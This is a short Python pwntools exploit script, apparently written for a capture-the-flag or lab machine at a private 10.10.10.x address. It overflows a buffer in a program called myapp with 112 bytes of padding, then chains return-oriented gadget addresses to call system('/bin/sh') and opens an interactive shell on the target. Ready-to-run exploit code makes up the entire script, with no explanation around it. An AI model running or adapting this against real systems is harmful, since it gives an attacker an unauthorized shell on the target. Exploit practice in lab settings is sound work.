#!/usr/bin/python3
#0x0040115f - main_call
#0x40116e - System
#0x401206 - Pop r1, pop , pop

from pwn import *
context(terminal=['tmux','new-window'])
#p = gdb.debug('./myapp','b main')
p = remote('10.10.10.147',1337)
context(os='linux', arch='amd64')

junk = ('A'*112).encode()
bin_sh = "/bin/sh\x00".encode()
system = p64(0x40116e) 
pop_r13 = p64(0x401206)
null = p64(0x0)
test = p64(0x401152) # RSP => RDI ,JMP R13

#call_main = p64(0x40115f)

#p.recvuntil('What do you want me to echo back?')
#p.sendline(junk+call_main)
p.sendline(junk + bin_sh + pop_r13 + system + null +null + test)
p.interactive()

